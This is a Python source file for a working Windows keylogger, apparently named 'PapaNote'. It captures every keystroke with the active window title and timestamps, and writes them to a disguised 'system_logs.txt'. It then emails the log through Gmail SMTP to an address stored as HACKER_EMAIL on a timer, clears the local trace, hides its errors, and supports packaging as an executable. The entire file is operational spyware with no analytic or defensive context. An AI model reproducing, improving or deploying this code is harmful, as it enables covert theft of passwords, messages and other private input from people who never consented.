import os
import ctypes
import smtplib
import threading
import time
from email.message import EmailMessage
from datetime import datetime
from pynput import keyboard
from dotenv import load_dotenv
import sys

if getattr(sys, 'frozen', False):
    env_path = os.path.join(sys._MEIPASS, '.env')
else:
    env_path = os.path.join(os.path.dirname(__file__), '.env')
load_dotenv(dotenv_path=env_path)

LOG_FILE = os.getenv("LOG_FILE", "system_logs.txt")
SMTP_EMAIL = os.getenv("SMTP_EMAIL", "")
SMTP_PASSWORD = os.getenv("SMTP_PASSWORD", "")
HACKER_EMAIL = os.getenv("HACKER_EMAIL", SMTP_EMAIL) 
REPORT_INTERVAL = int(os.getenv("REPORT_INTERVAL", 60)) 

def get_active_window_title() -> str:
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value if buff.value else "Unknown Window"

def send_log_via_email():
    if not os.path.exists(LOG_FILE):
        return
        
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_data = f.read()
        
    if not log_data.strip():
        return

    msg = EmailMessage()
    msg.set_content(log_data)
    msg['Subject'] = f"PapaNote Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    msg['From'] = SMTP_EMAIL
    msg['To'] = HACKER_EMAIL

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SMTP_EMAIL, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("")
    except Exception:
        pass

def report_loop():
    while True:
        time.sleep(REPORT_INTERVAL)
        if SMTP_EMAIL and SMTP_PASSWORD:
            send_log_via_email()

def start_keylogger() -> None:
    current_window = ""

    def on_press(key):
        nonlocal current_window
        
        try:
            active_window = get_active_window_title()
            
            if active_window != current_window:
                current_window = active_window
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"\n\n[{timestamp}] [Window: {current_window}]\n")
        except Exception:
            pass

        k = ""
        
        if hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            if key == keyboard.Key.space:
                k = " "
            elif key == keyboard.Key.enter:
                k = "[ENTER]\n"
            elif key == keyboard.Key.tab:
                k = "[TAB]\t"
            elif key == keyboard.Key.backspace:
                k = "[BACKSPACE]"
            else:
                k = f"[{str(key).replace('Key.', '').upper()}]"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(k)
            
    reporter_thread = threading.Thread(target=report_loop, daemon=True)
    reporter_thread.start()
            
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()